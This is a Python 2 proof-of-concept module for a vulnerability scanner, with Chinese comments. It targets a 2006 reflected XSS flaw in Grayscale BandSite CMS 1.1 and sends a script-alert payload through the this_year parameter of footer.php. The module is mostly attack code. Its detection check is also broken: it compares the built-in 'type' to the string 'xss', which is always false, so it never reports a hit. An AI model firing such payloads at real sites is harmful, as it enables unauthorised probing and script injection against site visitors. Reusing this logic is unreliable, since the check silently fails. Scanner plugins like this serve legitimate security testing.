# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Grayscale_0000'  # 平台漏洞编号
    name = 'Grayscale BandSite CMS 1.1 footer.php this_year Parameter XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2006-9-21'  # 漏洞公布时间
    desc = '''
        Grayscale BandSite CMS is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize
        user-supplied input data.These issues may allow an attacker to access sensitive information, execute arbitrary 
        server-side script code in the context of the affected webserver, or execute arbitrary script code in the browser of
        an unsuspecting user in the context of the affected site. This could help the attacker steal cookie-based 
        authentication credentials; other attacks are possible.Version 1.1.0 is vulnerable; other versions may also be affected.。
    '''  # 漏洞描述
    ref = 'https://www.securityfocus.com/bid/20137'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Grayscale BandSite CMS'  # 漏洞组件名称
    product_version = '1.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6edacaef-d64b-423a-8671-964dffe39026'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + \
                '/includes/footer.php?this_year=<script>alert(/Dirorder/)</script>'
            response = requests.get(vul_url, timeout=5).content
            if type == 'xss' and '>alert(/Dirorder/)<' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
